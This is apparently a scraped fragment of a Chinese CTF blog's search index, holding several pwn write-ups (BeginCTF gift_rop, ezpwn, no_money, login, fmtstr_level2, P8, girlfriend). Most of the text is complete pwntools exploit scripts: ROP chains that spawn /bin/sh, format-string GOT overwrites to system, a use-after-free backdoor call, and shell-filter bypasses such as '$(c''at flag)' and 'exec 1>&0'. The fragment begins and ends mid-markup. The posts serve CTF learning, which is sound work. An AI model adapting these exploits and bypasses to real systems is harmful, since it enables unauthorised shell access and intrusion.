&lt;p&gt;静态编译的栈溢出，和前几篇博客的p8差不多，脚本稍微修改下就行，再者就是关闭了标准输出和错误标准输出，这一点FSCTF有道类似的题，那道题还ban了cat和flag来着，绕过方法就是利用&lt;code&gt;exec 1&amp;gt;&amp;amp;0&lt;/code&gt;指令将标准输出重定向到标准输入，再执行命令也能回显到终端&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

io = process(&amp;quot;./gift_rop&amp;quot;)
elf = ELF(&amp;quot;./gift_rop&amp;quot;)
from struct import pack

p = b&#39;&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000409f9e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000448077) # pop rax ; ret
p += b&#39;/bin//sh&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044a4f5) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000409f9e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000043d1d0) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044a4f5) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000401f2f) # pop rdi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000409f9e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f20b) # pop rdx ; pop rbx ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x4141414141414141) # padding
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000448077) # pop rax ; ret
p += p64(59)
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000401ce4) # syscall

pay = b&#39;&#39;
for i in range(len(p)):
        pay += (ord(p[i:i+1])).to_bytes(1)
payload = b&#39;a&#39;*40 + pay

io.sendafter(b&#39;problem.\n&#39;, payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;ezpwn&#34;&gt;ezpwn&lt;/h1&gt;
&lt;p&gt;保护全开&lt;br&gt;
查看程序逻辑&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708517102652.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
看见菜单还以为是堆题（&lt;br&gt;
先看第一个选项，发现存在数组溢出漏洞，main函数和后门函数相差不远，只需修改一个字节便可得到shell&lt;/p&gt;
&lt;h2 id=&#34;注意&#34;&gt;注意：&lt;/h2&gt;
&lt;p&gt;1.读取数据用的是scanf函数，所以发送数据需要用sendline&lt;br&gt;
2.scanf函数的话输入123N只会读取前面的123，&#39;N&#39;保留在缓冲区中，被后面的getchar函数读取&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./ezpwn&amp;quot;)
elf = ELF(&amp;quot;./ezpwn&amp;quot;)

#gdb.attach(p)

p.sendlineafter(b&#39;\n&#39;,b&#39;1&#39;)
p.sendlineafter(b&#39;\n&#39;,b&#39;552\x4E&#39;)
p.sendlineafter(b&#39;\n&#39;,b&#39;4&#39;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看wp发现还有命令注入的做法，查了一下关键知识点就是&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&#39;$(c&#39;&#39;at flag)&#39;                    &#39;&#39;表示空字符，即c&#39;&#39;at = cat
$(cat flag)表示执行cat flag命令并将其结果作为变量的值
这行代码的作用是执行cat flag命令并将flag文件的内容作为参数传递给system函数。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;还是FSCTF那道题禁用了cat提供了思路，&lt;code&gt;&#39;$(tac flag)&#39;&lt;/code&gt;命令也能输出flag&lt;/p&gt;
&lt;h1 id=&#34;no_money&#34;&gt;no_money&lt;/h1&gt;
&lt;p&gt;查看保护&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708519762960.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
查看逻辑&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708519790405.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708519805390.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现存在格式化字符串漏洞，就是个被ban掉$符号的栈上格式化字符串，把target改为非0数即可得到shell，主要知识点就是&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;%3$n = %c%c%n
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由于开了PIE，所以先泄露ELF文件地址&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./no_money&amp;quot;)
elf = ELF(&amp;quot;./no_money&amp;quot;)

gdb.attach(p)

p.sendlineafter(b&#39;:&#39;, b&#39;%c&#39;*20 + b&#39;%p&#39;)
p.recvuntil(b&#39;0x&#39;)
base = int(p.recv(12), 16) - 0x1277
target = base + 0x404C

p.sendlineafter(b&#39;:&#39;, b&#39;%c&#39;*12 + b&#39;a&#39;*8 + b&#39;%n&#39;.ljust(8, b&#39;a&#39;) + p64(target))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">Beginctf(部分wp)</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/loginfei-zhan-shang-ge-shi-hua-zi-fu-chuan/"" data-c="
          &lt;h1 id=&#34;查看保护&#34;&gt;查看保护&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708494496233.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;查看程序逻辑&#34;&gt;查看程序逻辑&lt;/h1&gt;
&lt;p&gt;先输入name，然后跳到主逻辑&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708494579640.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现存在非栈上格式化字符串漏洞，并且不存在后门函数&lt;/p&gt;
&lt;h1 id=&#34;攻击思路&#34;&gt;攻击思路&lt;/h1&gt;
&lt;p&gt;1.泄露libc基地址和栈地址&lt;br&gt;
2.利用ebp链将printf的实际地址改为system（先将ebp+4和ebp+8的位置写入printf函数的got表地址和got表+2的地址，分两次修改实际地址，第一次改后4位（十六进制），第一次改前4位）&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708494770183.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
3.写入/bin/sh得到shell&lt;/p&gt;
&lt;h1 id=&#34;注意&#34;&gt;注意：&lt;/h1&gt;
&lt;p&gt;一定要一次性把printf函数实际地址改掉，不然后续调用printf函数时会调用其他函数，也会炸&lt;/p&gt;
&lt;h1 id=&#34;exp如下&#34;&gt;exp如下：&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./login&amp;quot;)
elf = ELF(&amp;quot;./login&amp;quot;)
p.sendline(&amp;quot;name&amp;quot;)

printf_got = 0x804B014

#sys
p.sendlineafter(&amp;quot;: \n&amp;quot;,&amp;quot;%15$p&amp;quot;)
p.recvuntil(&amp;quot;0x&amp;quot;)
__libc_start_main = int(p.recv(8),16) - 245
print(&amp;quot;main = &amp;quot;,hex(__libc_start_main))
base = __libc_start_main - 0x1EDF0
sys = base + 0x45830
print(&amp;quot;sys = &amp;quot;,hex(sys))

#stack
p.sendlineafter(&amp;quot;!\n&amp;quot;,&amp;quot;%6$p&amp;quot;)
p.recvuntil(&amp;quot;0x&amp;quot;)
stack = int(p.recv(8),16)
print(&amp;quot;stack = &amp;quot;,hex(stack))
ebp = stack - 16

s1 = (ebp + 4) &amp;amp; 0xffff
payload = b&#39;%&#39; + str(s1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%6$hn&#39;
p.sendlineafter(&amp;quot;!\n&amp;quot;,payload)
p.sendlineafter(&amp;quot;!\n&amp;quot;,&amp;quot;%45076c%10$hn&amp;quot;)

s2 = (ebp + 8) &amp;amp; 0xffff
payload = b&#39;%&#39; + str(s2).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%6$hn&#39;
p.sendlineafter(&amp;quot;!\n&amp;quot;,payload)
p.sendlineafter(&amp;quot;!\n&amp;quot;,&amp;quot;%45078c%10$hn&amp;quot;)

x1 = sys &amp;amp; 0xffff
payload = b&#39;%&#39; + str(x1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%7$hn&#39;
x2 = (sys &amp;gt;&amp;gt; 16) &amp;amp; 0xffff
payload += b&#39;%&#39; + str(0x10000 + x2 - x1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%8$hn&#39;
p.sendlineafter(&amp;quot;!\n&amp;quot;,payload)

p.sendafter(&amp;quot;!\n&amp;quot;,&amp;quot;/bin/sh&amp;quot;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708495217411.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">login（非栈上格式化字符串）</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/fmtstr_level2/"" data-c="
          &lt;h1 id=&#34;查看保护&#34;&gt;查看保护&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708318844529.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;查看程序逻辑&#34;&gt;查看程序逻辑&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708318883882.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
只有一次的改格式化字符串，看到&lt;code&gt;puts(&amp;quot;Okk,try to hack it;sh&amp;quot;);&lt;/code&gt;，给出了暗示，把puts函数got表改为system函数即可得到shell&lt;/p&gt;
&lt;h1 id=&#34;补fmtstr_payload&#34;&gt;补：fmtstr_payload&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;offset(int)：控制的第一个格式化程序的偏移量&lt;br&gt;
writes(dic)：格式为{addr:value , addr2:value2}，用于往addr里写入value的值&lt;br&gt;
numbwritten(int)：已经由printf函数写入(输出到终端)的字节数&lt;br&gt;
write_size(str)：必须是byte、short或int。（hhn，hn，n）&lt;/p&gt;
&lt;h1 id=&#34;攻击思路&#34;&gt;攻击思路：&lt;/h1&gt;
&lt;p&gt;1.利用第一次格式化字符串泄露libc基地址，并将fini_array改为main函数，使程序再次执行main函数&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708322154564.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
在fmtstr_payload前（0x20前有0x11个字节，地址+填充字节）&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708322323605.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
2.利用第二次格式化字符串将puts函数got表改为system&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./fmtstr_level2&amp;quot;)
elf = ELF(&amp;quot;./fmtstr_level2&amp;quot;)

fini = 0x4031F0
main = 0x40122E
puts = 0x4033F0

#gdb.attach(p)
payload = b&amp;quot;%45$paaa&amp;quot; + fmtstr_payload(7,{fini:elf.sym.main},numbwritten=0x11)
p.sendafter(&amp;quot;ID\n&amp;quot;,payload)

p.recvuntil(&amp;quot;0x&amp;quot;)
__libc_start_main = int(p.recv(12),16) - 243
print(&amp;quot;__libc_start_main = &amp;quot;,hex(__libc_start_main))
base = __libc_start_main - 0x26FC0
system = base + 0x55410

payload = fmtstr_payload(6,{puts:system})
p.sendafter(&amp;quot;ID\n&amp;quot;,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708322506294.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">fmtstr_level2(栈上格式化字符串)</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/p8/"" data-c="
          &lt;h1 id=&#34;通过查找字符串找到程序主逻辑&#34;&gt;通过查找字符串找到程序主逻辑&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708313279313.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
易分析出read函数和print函数（puts函数）差不多那个意思&lt;br&gt;
上面的sub_400BF0函数应该是一个计时器，防止动态调试的&lt;/p&gt;
&lt;h2 id=&#34;计时器&#34;&gt;计时器&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709725920685.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
直接修改机器码上的时间，实现绕过&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708317846276.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现v1没有溢出，貌似没啥漏洞，点击sub_400C40函数进去看看&lt;/p&gt;
&lt;h1 id=&#34;sub_400c40函数&#34;&gt;sub_400C40函数&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708313531502.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现主要逻辑就是把输入复制到v9里，然后把v9中的每个字节和0x66异或，此时发现v9只与rbp相差50个字节，而输入的可以有0x200个字节，发生了溢出，所以只要把构造的ROP链和0x66异或后发出，就和正常的栈溢出一样了（并且该程序非常的大，应该是静态编译的，有非常丰富的ROP，并且可以直接利用ROPgadget制造ROP链）&lt;/p&gt;
&lt;h1 id=&#34;制造rop链&#34;&gt;制造ROP链&lt;/h1&gt;
&lt;h2 id=&#34;注意&#34;&gt;注意：&lt;/h2&gt;
&lt;p&gt;工具生成的代码和我们日常使用的代码格式和风格上都有一定差距，从struct包中导入的pack函数也会和pwntools中的pack起冲突，如果一定要使用struct的pack，就在导入pwntools后再导入struct，这样就可以覆盖掉pack&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ROPgadget --binary p8 --ropchain
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b&#39;&#39;

p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
p += b&#39;/bin//sh&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004006e6) # pop rdi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044c156) # pop rdx ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040139c) # syscall
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发现长度超过了0x200，还有大量rax加一的指令（实际作用就是把rax置为59，前面出现了pop rax；ret），合并得到&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from struct import pack

# Padding goes here
p = b&#39;&#39;

p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
p += b&#39;/bin//sh&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004006e6) # pop rdi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044c156) # pop rdx ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
p += p64(59)
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040139c) # syscall
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp如下(又是万恶的类型转换浪费时间了🤡)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from ctypes import *
from pwn import *
from struct import pack
io = process(&#39;./p8&#39;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
elf = ELF(&#39;./p8&#39;)


# Padding goes here
p = b&#39;&#39;

p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
p += b&#39;/bin//sh&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004006e6) # pop rdi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044c156) # pop rdx ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
p += p64(59)
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040139c) # syscall

pay = b&#39;&#39;
for i in range(len(p)):
        pay += (ord(p[i:i+1]) ^ 0x66).to_bytes(1)
payload = b&#39;a&#39;*0x50 + pay

# ----------如果要直接对p修改需要将p（bytes对象）转换为 bytearray对象
#p = bytearray(p)
#for i in range(len(p)):
#	p[i:i+1] = (ord(p[i:i+1]) ^ 0x66).to_bytes(1)
#payload = b&#39;a&#39;*0x50 + p

io.sendafter(b&#39;Password: \n&#39;, payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708317770898.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">P8（ROPchain）</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/girlfriend/"" data-c="
          &lt;p&gt;和hacknote一样，脚本就改个后门地址还有size就行&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./girlfriend&amp;quot;)
elf = ELF(&amp;quot;./girlfriend&amp;quot;)

def add(size,string):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(str(size))
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(string)
    
def delete(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(idx))
    
def printf(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(idx))

add(30,&amp;quot;aaaa&amp;quot;)
add(30,&amp;quot;bbbb&amp;quot;)
delete(1)
delete(0)
payload = p64(0x400B9C)
add(16,payload)
printf(1)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708246141311.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">girlfriend（64位UAF）</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/hacknote/"" data-c="
          &lt;h1 id=&#34;查看保护&#34;&gt;查看保护&lt;/h1&gt;
